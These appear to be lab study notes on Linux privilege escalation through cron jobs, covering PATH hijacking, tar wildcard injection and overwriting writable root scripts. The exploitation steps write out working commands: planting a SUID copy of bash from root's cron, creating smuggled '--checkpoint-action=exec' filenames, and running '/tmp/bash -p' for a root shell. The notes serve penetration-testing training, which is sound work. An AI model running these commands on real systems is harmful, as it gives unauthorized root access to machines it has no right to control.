#Linux #PrivEsc #Cron #ScheduledTasks #BinaryPaths #Wildcards #Overwrites 

- ==Overwrites is most common (3rd one down)

# Cron (Path)
#BinaryPaths 
## **Detection**
Linux VM

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the value of the “`PATH`” variable.
	- Note jobs running every minute or few minutes
	- `* * * * * root script.sh`
	- `5 * * * * root /usr/local/bin/script.sh`
- Can also use `systemctl list-timers --all`

## **Exploitation**
Linux VM

1. In command prompt type:
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```
2. In command prompt type: `chmod +x /home/user/overwrite.sh`
3. Wait 1 minute for the Bash script to execute.
4. In command prompt type: `/tmp/bash -p`
5. In command prompt type: `id`

---

# Cron (Wildcards)
#Wildcards
## **Detection**

Linux VM

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script “`/usr/local/bin/compress.sh`”
3. In command prompt type: `cat /usr/local/bin/compress.sh`
4. From the output, notice the wildcard (`*`) used by ‘`tar`’.
	- Can manipulate wildcards!
	- e.g. `/usr/local/bin/compress.sh` script reads to compress `/home/user` folder and tar zip to `/tmp`
## **Exploitation**
Linux VM

1. In command prompt type:
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
```
2. `chmod +x /home/user/runme.sh`
3. `touch /home/user/--checkpoint=1`
4. `touch /home/user/--checkpoint-action=exec=sh\ runme.sh`
5. Wait 1 minute for the Bash script to execute.
6. In command prompt type: `/tmp/bash -p`
7. In command prompt type: `id`

---

# Cron (Overwrites)
#Overwrites

## ﻿Detection
Linux VM

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script “`overwrite.sh`”
3. In command prompt type: `ls -l /usr/local/bin/overwrite.sh`
4. From the output, notice the file permissions.

## **Exploitation**
Linux VM

1. In command prompt type:
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```
2. Wait 1 minute for the Bash script to execute.
3. In command prompt type: `/tmp/bash -p`
4. In command prompt type: `id`

---

# CTF Challenge

